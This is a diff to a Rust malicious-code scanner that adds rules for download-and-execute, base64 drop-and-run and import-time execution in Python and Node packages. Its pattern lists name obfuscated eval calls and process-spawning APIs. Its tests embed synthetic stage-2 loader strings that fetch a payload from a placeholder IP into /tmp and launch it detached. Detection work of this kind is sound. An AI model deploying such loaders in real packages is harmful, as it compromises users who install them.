@@ -177,6 +177,7 @@ const CRED_PATHS: &[&str] = &[
 
 const OBF_CALLS: &[&str] = &[
     "eval(atob(",
+    "eval(function(",
     "eval(buffer.from(",
     "function(atob(",
     "eval(string.fromcharcode",
@@ -218,6 +219,22 @@ pub fn scan_lines(path: &str, lines: &[(usize, String)], lists: &Lists) -> Vec<F
     let mut unref = false;
     let mut bin_fetch: Option<(usize, String)> = None;
     let mut chmod = false;
+    // 取って（または復号して）書いて動かす：同じファイルの増えた行にそろったら
+    let mut net_fetch: Option<(usize, String)> = None;
+    let mut spawn: Option<(usize, String)> = None;
+    let mut writes_tmp = false;
+    let mut decodes = false;
+    let mut writes_file = false;
+    // 別名で読み込んだモジュール（`import subprocess as _s` → `_s.Popen(`）でも拾えるよう、
+    // 「モジュールを読み込んだ」と「呼び出しの形」を分けて見る
+    let mut fetch_mod = false;
+    let mut fetch_call: Option<(usize, String)> = None;
+    let mut spawn_mod = false;
+    let mut spawn_call: Option<(usize, String)> = None;
+    let is_init = {
+        let name = path.rsplit('/').next().unwrap_or(path);
+        name == "__init__.py"
+    };
 
     for (n, line) in lines {
         let l = line.to_ascii_lowercase();
@@ -338,6 +355,105 @@ pub fn scan_lines(path: &str, lines: &[(usize, String)], lists: &Lists) -> Vec<F
             chmod = true;
         }
 
+        // コードの中からの取得・起動・書き込み（シェルを使わない形）
+        if [
+            "urllib.request.urlopen(",
+            "urllib.request.urlretrieve(",
+            "urlretrieve(",
+            "urlopen(",
+            "requests.get(",
+            "requests.post(",
+            "httpx.get(",
+            "http.client.",
+            "https.get(",
+            "http.get(",
+            "https.request(",
+        ]
+        .iter()
+        .any(|p| compact.contains(p))
+        {
+            net_fetch.get_or_insert((*n, line.clone()));
+        }
+        if [
+            "subprocess.popen(",
+            "subprocess.run(",
+            "subprocess.call(",
+            "subprocess.check_output(",
+            "os.system(",
+            "os.popen(",
+            "os.execv",
+            "os.startfile(",
+            "execsync(",
+            "execfilesync(",
+            "child_process').exec",
+            "child_process\").exec",
+            "spawnsync(",
+        ]
+        .iter()
+        .any(|p| compact.contains(p))
+            || (compact.contains("spawn(") && l.contains("child_process"))
+        {
+            spawn.get_or_insert((*n, line.clone()));
+        }
+        if l.contains("/tmp/")
+            || compact.contains("tempfile.")
+            || compact.contains("os.tmpdir()")
+            || l.contains("%temp%")
+        {
+            writes_tmp = true;
+        }
+        if compact.contains("b64decode(") || compact.contains("'base64')") || compact.contains("\"base64\")") {
+            decodes = true;
+        }
+        if compact.contains("open(")
+            && (compact.contains("'wb'") || compact.contains("\"wb\"") || compact.contains("'w'"))
+            || compact.contains("writefilesync(")
+            || compact.contains("urlretrieve(")
+        {
+            writes_file = true;
+        }
+        if [
+            "importurllib.request",
+            "urllib.requestas",
+            "fromurllib.requestimport",
+            "importrequests",
+            "importhttpx",
+            "require('https')",
+            "require(\"https\")",
+            "require('http')",
+            "require(\"http\")",
+        ]
+        .iter()
+        .any(|p| compact.contains(p))
+        {
+            fetch_mod = true;
+        }
+        if [".urlretrieve(", ".urlopen(", "urlopen(", "urlretrieve(", "requests.get(", ".get(", ".request("]
+            .iter()
+            .any(|p| compact.contains(p))
+        {
+            fetch_call.get_or_insert((*n, line.clone()));
+        }
+        // 外部コマンドの curl・wget で取る（`subprocess.run(["curl", …, "-o", dest])` の形）
+        if ["\"curl\"", "'curl'", "\"wget\"", "'wget'"].iter().any(|p| l.contains(p)) {
+            net_fetch.get_or_insert((*n, line.clone()));
+        }
+        if ["importsubprocess", "subprocessas", "fromsubprocessimport", "child_process"]
+            .iter()
+            .any(|p| compact.contains(p))
+        {
+            spawn_mod = true;
+        }
+        if [".popen(", ".run(", ".call(", ".check_output(", ".check_call(", "popen(", "execsync(", ".exec(", ".spawn("]
+            .iter()
+            .any(|p| compact.contains(p))
+        {
+            spawn_call.get_or_insert((*n, line.clone()));
+        }
+        if compact.contains("start_new_session=true") && (spawn.is_some() || spawn_mod) {
+            push(&mut out, "detach", *n, line);
+        }
+
         // CI のシークレット
         if compact.contains("tojson(secrets)")
             || l.contains("actions_id_token_request")
@@ -363,6 +479,26 @@ pub fn scan_lines(path: &str, lines: &[(usize, String)], lists: &Lists) -> Vec<F
     }
     if let (Some((n, l)), true) = (&bin_fetch, chmod) {
         push(&mut out, "download_exec", *n, l);
+    }
+    if net_fetch.is_none() && fetch_mod {
+        net_fetch = fetch_call.clone();
+    }
+    if spawn.is_none() && spawn_mod {
+        spawn = spawn_call.clone();
+    }
+    // 取って、置いて、動かす（2 段目の取得。2026 年の PyPI の乗っ取りで多い形）
+    if let (Some((n, l)), Some(_), true) = (&net_fetch, &spawn, writes_tmp || writes_file) {
+        push(&mut out, "download_exec", *n, l);
+    }
+    // 復号して、書いて、動かす（中身を base64 で隠した本体）
+    if let (Some((n, l)), true, true) = (&spawn, decodes, writes_file || writes_tmp) {
+        push(&mut out, "drop_exec", *n, l);
+    }
+    // パッケージの読み込み（import）だけで、取得や起動が走る
+    if is_init {
+        if let Some((n, l)) = spawn.as_ref().or(net_fetch.as_ref()) {
+            push(&mut out, "import_time_exec", *n, l);
+        }
     }
     out
 }
@@ -448,6 +584,40 @@ def _start():
         assert!(run("a.py", "for k in os.environ:\n    print(k)").is_empty());
         // CI の設定に secrets を渡すだけ
         assert!(run("x.yml", "env:\n  T: ${{ secrets.T }}").is_empty());
+    }
+
+    #[test]
+    fn python_stage2_loader() {
+        // 2026 年の PyPI の乗っ取り（__init__.py に足された 2 段目の取得）をまねた合成の文字列。宛先は文字列として書くだけ
+        let t = "import os, subprocess, urllib.request\n\
+                 if os.name == 'posix':\n\
+                 \x20   urllib.request.urlretrieve('https://203.0.113.9/x.pyz', '/tmp/x.pyz')\n\
+                 \x20   subprocess.Popen(['python3', '/tmp/x.pyz'], start_new_session=True)\n";
+        let f = run("pkg/__init__.py", t);
+        for want in ["detach", "download_exec", "import_time_exec", "raw_ip_url"] {
+            assert!(f.contains(&want.to_string()), "{want} が出ない: {f:?}");
+        }
+        // 同じ形でも __init__.py でなければ import_time_exec は出ない
+        assert!(!run("pkg/tools.py", t).contains(&"import_time_exec".to_string()));
+        // 復号して書いて動かす
+        let d = "import base64, subprocess, tempfile\nb = 'eA=='\nopen(p, 'wb').write(base64.b64decode(b))\nsubprocess.run([sys.executable, p])\n";
+        assert!(run("pkg/server.py", d).contains(&"drop_exec".to_string()));
+        // 別名で読み込んでも拾う
+        let a = "import subprocess as _sub, urllib.request as _u, os as _os\n\
+                 _dest = '/tmp/t.pyz'\n\
+                 _u.urlretrieve(_url, _dest)\n\
+                 _sub.Popen(['python3', _dest])\n";
+        assert!(
+            run("m/client/__init__.py", a).contains(&"download_exec".to_string()),
+            "{:?}",
+            run("m/client/__init__.py", a)
+        );
+        // 外部コマンドの curl で取る
+        let c = "import subprocess as _s\n_s.run(['curl', '-s', u, '-o', '/tmp/a.pyz'])\n_s.Popen([sys.executable, '/tmp/a.pyz'])\n";
+        assert!(run("m/__init__.py", c).contains(&"download_exec".to_string()));
+        // 取得だけ・起動だけでは出ない
+        assert!(run("pkg/net.py", "import requests\nr = requests.get(url)\n").is_empty());
+        assert!(run("pkg/cli.py", "import subprocess\nsubprocess.run(['git', 'status'])\n").is_empty());
     }
 
     #[test]
